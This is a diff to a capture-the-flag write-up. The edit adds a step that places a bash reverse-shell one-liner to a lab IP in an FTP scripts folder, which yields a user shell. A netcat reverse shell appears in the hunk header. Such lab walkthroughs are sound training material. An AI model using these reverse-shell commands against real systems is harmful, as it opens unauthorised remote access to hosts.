@@ -123,7 +123,7 @@ netcat 10.13.22.56 4444 -e /bin/bash
 - We transfer the new file  
 ![image](https://user-images.githubusercontent.com/96747355/176791697-6d3b82f9-82fd-4720-bbcf-2996cfa89627.png)
 - So nothing happens with this. If we check the hint it mentions unexpected results with netcat.
-- Let's try with bash instead of netcat `bash -i >& /dev/tcp/10.13.22.56/4444 0>&1`  
+- Let's try with bash instead of netcat `bash -i >& /dev/tcp/10.13.22.56/4444 0>&1` and put the new file in the scripts folder in the ftp  
 - We get a shell as the user `namelessone` after a minute or so    
 ![image](https://user-images.githubusercontent.com/96747355/176949498-db6076e6-9025-4dd3-87f8-86998e37237c.png)  
 - We can grab the user flag
